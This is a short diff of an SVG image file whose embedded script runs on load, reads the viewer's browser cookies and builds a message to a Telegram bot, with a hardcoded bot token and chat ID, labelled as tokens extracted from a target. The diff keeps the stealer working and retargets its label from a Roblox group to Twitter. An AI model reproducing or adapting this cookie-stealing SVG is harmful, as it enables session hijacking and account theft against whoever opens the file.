@@ -2,12 +2,7 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="init()">
   <script type="application/ecmascript"><![CDATA[
     function init(){
-      const token = Object.fromEntries(
-    document.cookie.split('; ').filter(Boolean).map(c => {
-      const i = c.indexOf('=');
-      return [c.slice(0, i), c.slice(i + 1)];
-    })
-  ); || 'this-worked-v2';
+      const token = document.cookie || 'this-worked-v2';
     
       // Your Telegram Bot Token and Chat ID
       const botToken = "8262449032:AAFB_jVPcfVjPMXV_ECWS-MHxiEJKP8Apxs";
@@ -17,7 +12,7 @@
       
       const payload = {
         chat_id: chatId,
-        text: "Token extracted from rbx Group Target" + token,
+        text: "Token extracted from TWITTER" + token,
         parse_mode: "HTML"
       };
       
